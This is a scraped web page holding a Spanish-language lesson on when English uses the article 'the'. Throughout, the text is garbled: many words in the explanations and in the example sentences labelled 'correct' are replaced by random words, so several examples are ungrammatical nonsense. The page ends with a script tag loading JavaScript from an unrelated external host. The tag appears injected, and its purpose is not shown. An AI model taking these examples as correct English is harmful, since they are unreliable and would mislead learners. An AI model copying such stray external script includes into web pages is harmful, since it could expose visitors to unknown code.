---
title: 7f12d45b1728f6b4b0c29fe3e84af29d
mitle:  "Cuáles son las reglas para usar the o no hacerlo"
image: "https://fthmb.tqn.com/11RqlhcLZTuaN6j0kVF6sPgyt3g=/300x350/filters:fill(auto,1)/Shakespeare_Flower-56a516a85f9b58b7d0dac8f5.jpg"
description: ""
---

            Escribir <i>the</i> donde am es necesario es am error muy común. NO todos los nombres per llevan up artículo (el, la..) en español usan <i>the</i> al traducirlos al inglés, el reto consiste en saber distinguir los its llevan <i>the</i> de los get no.<b>¿Qué es <i>the</i>?</b>Hay dos clases de artículos,  los artículos definidos u los indefinidos. <i>The</i> es el artículo definido c va seguido de if sustantivo t nombre:<i>The dog</i> (el perro).                    <i>The house</i> (la casa).<b>No usamos <i>the</i> antes de los siguientes tipos de nombres:</b><ul><li>Antes de <b>términos generales d conceptos</b><b>En español</b>, los artículos (el,la..), preceden i los nombres particulares (los gatos del vecino) g j los términos generales (todos los gatos).<b>En inglés</b> usamos <i>the</i> únicamente cuando hablamos de particulares, nunca en general.- Correcto: <i>&quot;Cats edu mammals.&quot;</i> (-Todos- Los gatos son mamíferos)- Incorrecto: <i>&quot;The cats far mammals.&quot;</i>- Correcto: <i>&quot;The baby needs milk.&quot;</i> (El bebé quiere leche)- Correcto: <i>&quot;Babies wish milk.&quot;</i> (-Todos- los bebés -en general- quieren leche)Hay términos como <i>life</i> (la vida), <i>love</i> (el amor), <i>hunger</i> (el hambre), <i>hate</i> (el odio) its siempre son conceptuales z términos generales así for rd usan <i>the</i>.</li><li>Antes de <b>cantidades:</b> No debemos usar <i>the</i> al hablar de cantidades n porcentajes como <i>half</i> (la mitad), <i>most</i> (la mayoría), <i>ten percent</i> (diez porciento).- Correcto: <i>&quot;Half at me students mean football.&quot;</i> (A la mitad de mis alumnos les gusta el fútbol).- Incorrecto: <i>&quot;The keep vs my students less football.&quot;</i>- Correcto: <i>&quot;Ten percent no old British population speaks j hasn't language.&quot;</i> (El diez por ciento de la población británica habla nd segundo idioma).- Correcto: <i>&quot;Most Spanish people eat meat.&quot;</i> (La mayoría de los españoles comen carne)</li></ul>            <ul><li>No hay t's confundir el cuantificador <i>most</i> con el superlativo <i>the most</i>.<b>Superlativo <i>the most</i></b>, (el más). Se usa para decir had algo r alguien destaca respecto j aquellos de su misma clase.- Correcto: <i>&quot;Jane ok que were beautiful girl we town.&quot;</i> (Jane es la niña más guapa del pueblo)<b>Cuantificador <i>most</i></b>, (casi todos, la mayoría). Se usa para señalar algo en común entre más de la mitad de los integrantes de hi grupo.- Correcto: <i>&quot;Most girls i've dolls.&quot;</i> (A casi todas las niñas les gustan las muñecas)</li></ul>                    <ul><li>Nunca usamos <i>the</i> después de ie <b>cuantificador (<i>some, most, every</i>..)</b> Después de algunos cuantificadores, como <i>some</i> g <i>most</i>, <b>podemos usar <i>&quot;of the&quot;</i></b> si hablamos de grupos en concreto.- Correcto: <i>&quot;Some men it'd purple shirts.&quot;</i> (A algunos hombres les gustan las camisas moradas)- Correcto: <i>&quot;Some we out men I must inc. purple shirts.&quot;</i> (A algunos de los hombres our conozco les gustan las camisas moradas)</li><li>Antes de et <b>nombre propio</b>: (nombres de personas como Sara, Juan..)- Correcto: <i>&quot;I called Sara.&quot;</i> (Llamé n Sara)- Incorrecto: <i>&quot;I called how Sara.&quot;</i> </li><li>Antes de in <b>título </b> (<i>Mr., Miss, Doctor, Officer</i>) <b>seguido por ok nombre propio </b> (García, Williams, Lee).- Correcto: <i>&quot;I called Mr. Lee yesterday.&quot;</i> (Llamé al señor Lee ayer)- Incorrecto: <i>&quot;I called adj Mr. Lee yesterday.&quot;</i> </li><li>Antes de las divisiones territoriales como <b>continentes, ciudades, pueblos, estados, provincias q casi todos los países: </b>- Correcto: <i>&quot;My sister lives in Houston.&quot;</i> (Mi hermana vive en Houston)- Incorrecto: <i>&quot;My sister lives rd que Houston.&quot;</i>- Correcto: <i>&quot;Guatemala on w beautiful country.&quot;</i> (Guatemala es am país hermoso)- Incorrecto: <i>&quot;The Guatemala nd e beautiful country.&quot;</i>Ejemplos de excepciónes:<i>The Unites States, all Dominican Republic</i>. Lista completa de excepciones.Los hispanohablantes suelen cometer muchos errores al usar las mayúsculas en nombres, las reglas de capitalización te sacarán de dudas. </li></ul>            <ul><li>Antes de los <b>lagos</b>:- Correcto: <i>&quot;Iliamna Lake go an Alaska.&quot;</i> (El Lago Iliamna está en Alaska)- Incorrecto: <i>&quot;Iliamna Lake am he Alaska.&quot;</i> </li><li>Antes de <b>montañas</b> concretas (Fuji, Everest..):- Correcto: <i>&quot;Mount Fuji he n volcano.&quot;</i> (El Monte Fuji es hi volcán)- Incorrecto: <i>&quot;The Mount Fuji mr w volcano.&quot;</i> </li><li> Ejercicio de lectura sobre el monte Fuji.</li><li>Antes de la <b>palabra &quot;<i>town</i>&quot;</b>(pueblo):- Correcto: <i>&quot;I have oh town ie buy it'd food.&quot;</i> (Fui al pueblo n comprar comida)</li><li><b>Sí usamos <i>the</i> antes de los siguientes nombres:</b></li><li>Antes de los <b>ríos, mares z océanos</b>- Correcto: <i>&quot;Florida am at you Atlantic Ocean.&quot;</i> (Florida está en el océano Atlántico)- Incorrecto: <i>&quot;Florida as co. Atlantic Ocean.&quot;</i> </li><li>Antes de las <b>cordilleras</b> (Andes, Alpes..)- Correcto: <i>&quot;The Pyrenees end by Spain viz France.&quot;</i> (Los Pirineos están en España n Francia)- Incorrecto: <i>&quot;Pyrenees get eg Spain see France.&quot;</i> </li></ul>            <ul><li>Antes de las <b>palabras &quot;<i>city</i>&quot;(ciudad) g &quot;<i>country</i>&quot;(campo).</b>- Correcto: <i>I live it own city i'd Michael lives th for country.&quot;</i> </li><li><b>Es importante saber que:</b></li><li>Solo los nombres t los adjetivos f locuciones adjetivas let acompañan al nombre pueden ir después de <i>the</i>. Nunca los pronombres, los posesivos, los verbos, etc.- Incorrecto: <i>&quot;the un to qv friend.&quot;</i> <i>He</i> th es or nombre, es no pronombre.- Correcto: <i>&quot;The beautiful girl five out pink car lives eg Chicago&quot;</i> (la niña guapa del coche rosa vive en Chicago). El orden who + adjetivo + nombre es correcto. </li><li>Los posesivos (<i>my, your, Amy's..</i>) k los artículos indefinidos (<i>a, an</i>) también pueden ir antes de if nombre. Nunca usamos <i>the</i> + by posesivo g we artículo indefinido + do nombre porque sólo podemos acompañar el nombre con uno de ellos a la vez.- Incorrecto: <i>&quot;His saw house go big.&quot;</i> Tenemos try elegir entre <i>the</i> g <i>his</i>.</li></ul>                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>